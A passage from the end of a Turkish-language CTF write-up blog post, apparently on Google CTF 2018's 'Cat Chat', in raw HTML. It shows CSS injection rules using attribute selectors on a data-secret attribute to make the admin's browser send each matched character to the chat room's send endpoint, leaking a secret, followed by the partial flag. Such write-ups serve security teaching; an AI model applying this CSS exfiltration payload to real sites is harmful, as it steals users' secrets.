class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=2]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=<span class="hljs-number">2</span>);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=3]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=<span class="hljs-number">3</span>);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=4]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=<span class="hljs-number">4</span>);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=5]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=<span class="hljs-number">5</span>);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=6]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=<span class="hljs-number">6</span>);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=7]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=<span class="hljs-number">7</span>);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=8]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=<span class="hljs-number">8</span>);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=9]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=<span class="hljs-number">9</span>);<br>&#125;<br><br><span class="hljs-selector-tag">span</span><span class="hljs-selector-attr">[data-secret^=_]</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(/room/fa5c99a4-<span class="hljs-number">1</span>bde-<span class="hljs-number">4998</span>-a289-a0f424ef2e0f/send?name=admin&amp;msg=_);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>Dedik ve flag’in ilk harfini aldık</p>
<p><img src="cat-chat6.png" alt="yrmm"></p>
<p>Tek tek yapmak yerine azıcık otomize etmek gerek. Yarışma esnasında yazdığımız bettiği bulamıyorum.</p>
<p><img src="cat-chat7.png" alt="yrmm"></p>
<p>Ve flag <strong>CTF{L0LC47S_43V3R</strong></p><div id="paginator"></div></div><div id="post-footer"><hr><a href="/2018/07/23/Image-Share-Box-CTFZone-2018/">← Prev Image Share Box - CTFZone 2018</a><span style="color: #fe2"> | </span><a href="/2018/06/27/JS-Safe-2-0-Google-CTF/">JS Safe 2.0 - Google CTF Next →</a><hr></div><div id="bottom-btn"><a id="to-index" href="#post-index" title="index">≡</a><a id="to-top" href="#post-title" title="to top">∧</a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/logo.webp" alt="Logo"></a><h1 id="Dr"><a href="/">~nya</a></h1></div><div id="aside-block"><h1>INDEX</h1><div id="post-index"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#On-inceleme"><span class="toc-number">1.</span> <span class="toc-text">Ön inceleme</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analiz-ve-hata-kesfi"><span class="toc-number">2.</span> <span class="toc-text">Analiz ve hata keşfi</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Server-side-kod-inceleme"><span class="toc-number">2.1.</span> <span class="toc-text">Server-side kod inceleme</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Client-side-kod-inceleme"><span class="toc-number">2.2.</span> <span class="toc-text">Client-side kod inceleme</span></a></li></ol></li></ol></div></div><footer><nobr>published with&nbsp;<a target="_blank" rel="noopener" href="http://hexo.io">Hexo&nbsp;</a></nobr><wbr><nobr>Theme&nbsp;<a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknight&nbsp;</a></nobr><wbr><nobr>by&nbsp;<a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><script src="/js/arknights.js"></script><script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/10.1.2/highlight.min.js"></script><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" media="print" onload="this.media='all'"></body></html>